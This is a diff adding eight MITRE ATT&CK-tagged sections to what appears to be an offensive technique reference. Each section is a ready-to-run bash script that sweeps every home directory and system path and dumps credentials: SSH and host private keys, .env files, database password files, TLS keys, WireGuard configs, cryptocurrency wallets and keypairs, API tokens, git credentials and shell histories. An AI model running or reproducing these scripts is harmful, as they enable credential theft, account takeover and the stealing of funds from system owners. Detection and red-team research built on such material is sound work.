@@ -87,6 +87,14 @@
 - [Taking Apart URL Shorteners with cURL (T1082)](#taking-apart-url-shorteners-with-curl-t1082)
 - [Email Spoofing PHP (T1566)](#email-spoofing-php-t1566)
 - [Linux SIEM Bypass (T1006)](#linux-siem-bypass-t1006)
+- [SSH Key and Host Key Harvesting (T1552.004)](#ssh-key-and-host-key-harvesting-t1552004)
+- [Environment File Credential Harvesting (T1552.001)](#environment-file-credential-harvesting-t1552001)
+- [Database Credential File Harvesting (T1552.001)](#database-credential-file-harvesting-t1552001)
+- [TLS/SSL Private Key Harvesting (T1552.004)](#tlsssl-private-key-harvesting-t1552004)
+- [VPN Configuration Harvesting (T1552.001)](#vpn-configuration-harvesting-t1552001)
+- [Cryptocurrency Wallet Harvesting (T1005)](#cryptocurrency-wallet-harvesting-t1005)
+- [Webhook and API Key Discovery (T1552.001)](#webhook-and-api-key-discovery-t1552001)
+- [Application Credential File Harvesting (T1552.001)](#application-credential-file-harvesting-t1552001)
 
 ---
 
@@ -1834,4 +1842,213 @@ bin:*:19436:0:99999:7:::
 sys:*:19436:0:99999:7:::
 sync:*:19436:0:99999:7:::
 games:*:19436:0:99999:7:::
+```
+
+## SSH Key and Host Key Harvesting (T1552.004)
+
+Comprehensive SSH credential harvesting across all user home directories and system host keys:
+
+```bash
+# Harvest user SSH private keys, configs, and known hosts
+for home in /home/* /root; do
+  for f in .ssh/id_rsa .ssh/id_ed25519 .ssh/id_ecdsa .ssh/id_dsa \
+           .ssh/authorized_keys .ssh/known_hosts .ssh/config; do
+    [ -f "$home/$f" ] && echo "=== $home/$f ===" && cat "$home/$f"
+  done
+  # Catch non-standard key filenames
+  find "$home/.ssh" -type f 2>/dev/null | while read -r f; do
+    echo "=== $f ===" && cat "$f"
+  done
+done
+
+# Harvest SSH host private keys (requires root)
+find /etc/ssh -name "ssh_host*_key" -type f 2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f"
+done
+```
+
+## Environment File Credential Harvesting (T1552.001)
+
+Environment files commonly contain API keys, database connection strings, and cloud credentials in plaintext. Searching the filesystem for `.env` variants:
+
+```bash
+# Check common relative paths from current working directory
+for f in .env .env.local .env.production .env.development .env.staging .env.test; do
+  for d in . .. ../..; do
+    [ -f "$d/$f" ] && echo "=== $d/$f ===" && cat "$d/$f"
+  done
+done
+
+# Check system-wide environment files
+cat /etc/environment 2>/dev/null
+cat /app/.env 2>/dev/null
+
+# Recursive search across common application directories
+find /home /root /opt /srv /var/www /app /data /var/lib /tmp \
+  -maxdepth 6 -name ".env*" -type f 2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f"
+done
+```
+
+## Database Credential File Harvesting (T1552.001)
+
+Database clients store credentials in dotfiles and system-wide configs:
+
+```bash
+# PostgreSQL password files
+for home in /home/* /root; do
+  [ -f "$home/.pgpass" ] && echo "=== $home/.pgpass ===" && cat "$home/.pgpass"
+done
+cat /var/lib/postgresql/.pgpass 2>/dev/null
+
+# MySQL/MariaDB credentials
+for home in /home/* /root; do
+  [ -f "$home/.my.cnf" ] && echo "=== $home/.my.cnf ===" && cat "$home/.my.cnf"
+done
+cat /etc/mysql/my.cnf 2>/dev/null
+
+# Redis configuration (may contain requirepass)
+cat /etc/redis/redis.conf 2>/dev/null | grep -i "requirepass\|masterauth"
+
+# MongoDB RC files
+for home in /home/* /root; do
+  [ -f "$home/.mongorc.js" ] && echo "=== $home/.mongorc.js ===" && cat "$home/.mongorc.js"
+done
+
+# LDAP configuration (may contain bind credentials)
+for f in /etc/ldap/ldap.conf /etc/openldap/ldap.conf /etc/ldap.conf \
+         /etc/ldap/slapd.conf /etc/openldap/slapd.conf; do
+  [ -f "$f" ] && echo "=== $f ===" && cat "$f"
+done
+
+# Database credential environment variables
+env | grep -iE "(DATABASE|DB_|MYSQL|POSTGRES|MONGO|REDIS|VAULT)"
+```
+
+## TLS/SSL Private Key Harvesting (T1552.004)
+
+TLS private keys enable man-in-the-middle attacks against encrypted traffic or impersonation of services:
+
+```bash
+# System SSL private keys
+find /etc/ssl/private -name "*.key" -type f 2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f"
+done
+
+# Let's Encrypt certificates and private keys
+find /etc/letsencrypt -name "*.pem" -type f 2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f"
+done
+
+# Broad search for key material across the filesystem
+find /home /root /opt /srv /var/www /app /data /var/lib /tmp \
+  -maxdepth 5 -type f \( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" \) \
+  2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f"
+done
+```
+
+## VPN Configuration Harvesting (T1552.001)
+
+VPN configurations contain pre-shared keys and endpoint information that enable network pivoting:
+
+```bash
+# WireGuard configurations (contain private keys and peer info)
+find /etc/wireguard -name "*.conf" -type f 2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f"
+done
+
+# Dump active WireGuard interface configurations
+wg showconf all 2>/dev/null
+```
+
+## Cryptocurrency Wallet Harvesting (T1005)
+
+Cryptocurrency node configurations contain RPC credentials and wallet files contain private keys:
+
+```bash
+# Bitcoin, Litecoin, Dogecoin, Zcash, Dash, Ripple, Monero configs
+for home in /home/* /root; do
+  for coin in .bitcoin/bitcoin.conf .litecoin/litecoin.conf .dogecoin/dogecoin.conf \
+              .zcash/zcash.conf .dashcore/dash.conf .ripple/rippled.cfg \
+              .bitmonero/bitmonero.conf; do
+    [ -f "$home/$coin" ] && echo "=== $home/$coin ===" && cat "$home/$coin"
+  done
+done
+
+# Bitcoin wallet files
+find /home /root -path "*/.bitcoin/wallet*.dat" -type f 2>/dev/null
+
+# Ethereum keystore files (encrypted private keys)
+find /home /root -path "*/.ethereum/keystore/*" -type f 2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f"
+done
+
+# Cardano signing and verification keys
+find /home /root -path "*/.cardano/*" \( -name "*.skey" -o -name "*.vkey" \) -type f 2>/dev/null
+
+# Solana keypairs
+for home in /home/* /root; do
+  find "$home/.config/solana" -type f 2>/dev/null | while read -r f; do
+    echo "=== $f ===" && cat "$f"
+  done
+done
+for d in /home/sol /home/solana /opt/solana /solana /app /data; do
+  [ -f "$d/validator-keypair.json" ] && echo "=== $d/validator-keypair.json ===" && cat "$d/validator-keypair.json"
+done
+
+# Search current directory for keypair and wallet JSON files
+find . -maxdepth 8 -type f \( -name "id.json" -o -name "keypair.json" -o -name "*-keypair.json" \
+  -o \( -name "wallet*.json" \) \) 2>/dev/null
+
+# RPC credentials in cryptocurrency configs
+grep -r "rpcuser\|rpcpassword\|rpcauth" /root /home 2>/dev/null
+```
+
+## Webhook and API Key Discovery (T1552.001)
+
+Searching the filesystem for hardcoded webhook URLs and API keys:
+
+```bash
+# Slack and Discord webhook URLs
+grep -r "hooks.slack.com\|discord.com/api/webhooks" . 2>/dev/null | head -20
+
+# API keys and tokens in configuration files
+grep -rE "api[_-]?key|apikey|api[_-]?secret|access[_-]?token" . \
+  --include="*.env*" --include="*.json" --include="*.yml" --include="*.yaml" \
+  2>/dev/null | head -50
+```
+
+## Application Credential File Harvesting (T1552.001)
+
+Various applications store credentials in dotfiles:
+
+```bash
+for home in /home/* /root; do
+  # Git credentials (plaintext username:password)
+  for f in .git-credentials .gitconfig; do
+    [ -f "$home/$f" ] && echo "=== $home/$f ===" && cat "$home/$f"
+  done
+
+  # Package manager and service tokens
+  for f in .npmrc .vault-token .netrc; do
+    [ -f "$home/$f" ] && echo "=== $home/$f ===" && cat "$home/$f"
+  done
+
+  # Mail and FTP client configs
+  for f in .lftp/rc .msmtprc; do
+    [ -f "$home/$f" ] && echo "=== $home/$f ===" && cat "$home/$f"
+  done
+
+  # Shell and application history files
+  for hist in .bash_history .zsh_history .sh_history \
+              .mysql_history .psql_history .rediscli_history; do
+    [ -f "$home/$hist" ] && echo "=== $home/$hist ===" && cat "$home/$hist"
+  done
+done
+
+# System-level mail and service configs
+for f in /etc/postfix/sasl_passwd /etc/msmtprc; do
+  [ -f "$f" ] && echo "=== $f ===" && cat "$f"
+done
 ```
